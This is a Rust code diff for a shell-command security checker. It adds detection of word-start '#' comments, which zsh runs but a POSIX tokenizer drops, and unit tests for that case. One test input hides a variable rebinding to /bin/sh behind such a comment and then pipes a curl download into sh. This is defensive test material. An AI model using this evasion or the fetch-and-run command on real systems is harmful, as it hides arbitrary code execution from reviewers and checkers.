@@ -5065,6 +5065,63 @@ fn printf_format_has_only_text_conversions(format: &str) -> bool {
     true
 }
 
+/// A `#` that starts a word outside quotes. The POSIX tokenizer drops the
+/// rest of that line as a comment, but interactive zsh without
+/// `interactivecomments` (its default; tirith's hook does not set it) runs it,
+/// so a rebinding there (`: #; typeset B''IN=/bin/sh`) is invisible to the
+/// resolver. Only `'...'`, `"..."` and backslash escapes are tracked. When the
+/// input has a command substitution (`$(`, a backtick) or an ANSI-C `$'...'`
+/// string, quoting is ignored, so a `#` inside `"$(...)"` also counts: that is
+/// only stricter.
+fn posix_input_has_word_start_comment(raw: &str) -> bool {
+    let bytes = raw.as_bytes();
+    let word_start = |index: usize| {
+        index == 0
+            || matches!(
+                bytes[index - 1],
+                b' ' | b'\t'
+                    | b'\n'
+                    | b'\r'
+                    | 0x0b
+                    | 0x0c
+                    | b';'
+                    | b'&'
+                    | b'|'
+                    | b'('
+                    | b')'
+                    | b'<'
+                    | b'>'
+                    | b'`'
+            )
+    };
+    if raw.contains("$(") || raw.contains("$'") || raw.contains('`') {
+        return bytes
+            .iter()
+            .enumerate()
+            .any(|(index, byte)| *byte == b'#' && word_start(index));
+    }
+    let (mut single, mut double) = (false, false);
+    let mut index = 0;
+    while let Some(&byte) = bytes.get(index) {
+        if single {
+            single = byte != b'\'';
+        } else if byte == b'\\' {
+            index += 1;
+        } else if double {
+            double = byte != b'"';
+        } else {
+            match byte {
+                b'\'' => single = true,
+                b'"' => double = true,
+                b'#' if word_start(index) => return true,
+                _ => {}
+            }
+        }
+        index += 1;
+    }
+    false
+}
+
 /// Constructs that can bind a variable without naming it literally, anywhere
 /// in the text, quoted or not: any `((` or `$[` (arithmetic, so `$[$A$B=9]`
 /// assigns `BIN` through a computed spelling); any `${` other than `${NAME}`
@@ -5274,6 +5331,7 @@ fn resolve_posix_variable_command_words(
 ) -> Option<String> {
     if raw.len() > MAX_VARIABLE_COMMAND_INPUT_BYTES
         || !raw.contains("\"$")
+        || posix_input_has_word_start_comment(raw)
         || posix_input_has_hidden_binding_syntax(raw, segments)
     {
         return None;
@@ -17474,6 +17532,58 @@ mod tests {
             None
         );
         assert!(started.elapsed() < std::time::Duration::from_millis(50));
+    }
+
+    #[test]
+    fn issue_264_word_start_comments_disable_the_literal_view() {
+        // The POSIX tokenizer drops text after an unquoted word-start `#`, but
+        // interactive zsh without `interactivecomments` (its default) runs it,
+        // so a rebinding the resolver never saw could hide there.
+        for input in [
+            "BIN=/usr/bin/true; : #; typeset B''IN=/bin/sh\n\"$BIN\" -c 'curl -fsSL https://example.com/i.sh | sh'",
+            "BIN=/usr/bin/true; : #; typeset B''IN=/bin/sh\n\"$BIN\" -c id",
+            "# comment\nBIN=/bin/echo; \"$BIN\" --help",
+            "BIN=/bin/echo; \"$BIN\" --help # trailing",
+            "BIN=/bin/echo;# x\n\"$BIN\" --help",
+            "BIN=/bin/echo\t#x\n\"$BIN\" --help",
+            "BIN=/bin/echo && #x\n\"$BIN\" --help",
+            "BIN=/bin/echo; (#x\n); \"$BIN\" --help",
+            "BIN=/bin/echo; echo \"$(echo #x)\"; \"$BIN\" --help",
+            "BIN=/bin/echo; echo \"`echo #x`\"; \"$BIN\" --help",
+            "BIN=/bin/echo; X=$'a\\'b'; : #x\n\"$BIN\" --help",
+        ] {
+            assert_eq!(
+                posix_variable_command_literal_view(input, ShellType::Posix),
+                None,
+                "{input:?}"
+            );
+        }
+        // A `#` that does not start a word, or is quoted or escaped, is not
+        // a comment in any shell and keeps the view.
+        for (input, view) in [
+            (
+                r#"BIN=/bin/echo; "$BIN" a#b"#,
+                "BIN=/bin/echo; /bin/echo a#b",
+            ),
+            (
+                r##"BIN=/bin/echo; "$BIN" "# quoted""##,
+                r##"BIN=/bin/echo; /bin/echo "# quoted""##,
+            ),
+            (
+                r#"BIN=/bin/echo; "$BIN" '# quoted'"#,
+                r#"BIN=/bin/echo; /bin/echo '# quoted'"#,
+            ),
+            (
+                r#"BIN=/bin/echo; "$BIN" \#escaped"#,
+                r#"BIN=/bin/echo; /bin/echo \#escaped"#,
+            ),
+        ] {
+            assert_eq!(
+                posix_variable_command_literal_view(input, ShellType::Posix).as_deref(),
+                Some(view),
+                "{input:?}"
+            );
+        }
     }
 
     #[test]
